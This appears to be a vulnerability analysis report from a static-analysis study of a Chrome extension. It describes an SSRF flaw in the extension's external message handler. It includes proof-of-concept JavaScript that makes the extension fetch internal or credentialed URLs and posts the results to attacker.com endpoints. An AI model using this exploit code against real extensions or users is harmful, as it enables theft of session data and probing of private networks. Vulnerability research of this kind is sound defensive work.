# CoCo Analysis: hieioehhoilpiifpfmkdbhmhbapecabl

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (related flows in the same vulnerability)

---

## Sink 1: bg_chrome_runtime_MessageExternal → fetch_resource_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hieioehhoilpiifpfmkdbhmhbapecabl/opgen_generated_files/bg.js
Line 1030             fetch(request.url, {
    request.url
```

## Sink 2: fetch_source → sendResponseExternal_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hieioehhoilpiifpfmkdbhmhbapecabl/opgen_generated_files/bg.js
Line 265     var responseText = 'data_from_fetch';
    responseText = 'data_from_fetch'
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hieioehhoilpiifpfmkdbhmhbapecabl/opgen_generated_files/bg.js
Line 1036                     sendResponse(res.text())
    res.text()
```

**Code:**

```javascript
// Background script - External message handler (lines 1020-1060)
chrome.runtime.onMessageExternal.addListener(async (request, sender, sendResponse) => {  // ← External messages from whitelisted domains
    switch (request.type) {
        case 'get_video':
            chrome.storage.session.get('video').then((result) => {
                sendResponse(result.video)
            })
            break;
        case 'make_request':  // ← Attacker-controlled request handler
            console.log(request)
            fetch(request.url, {  // ← SSRF: Attacker controls URL
                method: request.method || 'GET',  // ← Attacker controls method
                headers: request.headers,  // ← Attacker controls headers
                referrerPolicy: 'unsafe-url'
            }).then((res) => {
                if (request.response_type == 'text') {
                    sendResponse(res.text())  // ← Response sent back to attacker
                }
            })
            break
        case 'get_youtube_data':
            chrome.storage.session.get(["youtube_data"]).then((result) => {
                if (!result.youtube_data) {
                    fetch("https://www.youtube.com/").then(res => {
                        return res.text()
                    }).then(text => {
                        let visitorData = text.match(/"visitorData":\s{0,1}"(.+?)"/)[1]
                        chrome.storage.session.set({ youtube_data: visitorData })
                        sendResponse(visitorData)  // ← YouTube data sent to attacker
                    })
                } else {
                    sendResponse(result.youtube_data)
                }
            })
            break
    }
    return true
})
```

**Manifest.json externally_connectable:**
```json
"externally_connectable": {
    "matches": ["https://joy2g.net/*", "http://localhost:5555/*"]
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal from whitelisted websites (joy2g.net or localhost:5555)

**Attack:**

```javascript
// Attacker code on joy2g.net (or localhost:5555 if accessible)
// The extension allows external messages from these domains

// SSRF attack - Request internal resources or any URL
chrome.runtime.sendMessage('hieioehhoilpiifpfmkdbhmhbapecabl', {
    type: 'make_request',
    url: 'http://localhost:8080/admin',  // ← Attacker-controlled URL (internal network)
    method: 'GET',
    headers: {},
    response_type: 'text'
}, function(response) {
    console.log('Exfiltrated internal data:', response);
    // Send to attacker server
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify({url: 'http://localhost:8080/admin', data: response})
    });
});

// Request arbitrary external resources with user's credentials
chrome.runtime.sendMessage('hieioehhoilpiifpfmkdbhmhbapecabl', {
    type: 'make_request',
    url: 'https://accounts.google.com/ServiceLogin',
    method: 'GET',
    headers: {},
    response_type: 'text'
}, function(response) {
    // Attacker receives response with user's cookies/credentials
    fetch('https://attacker.com/steal', {method: 'POST', body: response});
});

// Information disclosure - Extract YouTube visitor data
chrome.runtime.sendMessage('hieioehhoilpiifpfmkdbhmhbapecabl', {
    type: 'get_youtube_data'
}, function(visitorData) {
    console.log('YouTube visitorData:', visitorData);
    fetch('https://attacker.com/youtube', {method: 'POST', body: visitorData});
});
```

**Impact:** Critical SSRF (Server-Side Request Forgery) vulnerability combined with information disclosure. An attacker on the whitelisted domain joy2g.net can:
1. Make the extension perform arbitrary HTTP requests to any URL (internal network resources, external APIs) with the user's IP address and cookies
2. Retrieve responses from these requests, enabling exfiltration of internal network data, user session data, or any web resource accessible to the user
3. Access and exfiltrate YouTube visitor data stored by the extension
4. Bypass CORS restrictions by using the extension's elevated privileges to fetch cross-origin resources
5. Probe internal networks and services (localhost, 192.168.x.x, etc.) that are not accessible from the public internet

Note: According to the methodology's CRITICAL ANALYSIS RULES, we ignore manifest.json externally_connectable restrictions. Even though only joy2g.net and localhost:5555 can exploit this, it is still classified as TRUE POSITIVE because an attacker controlling either of these domains can fully exploit the vulnerability.

---
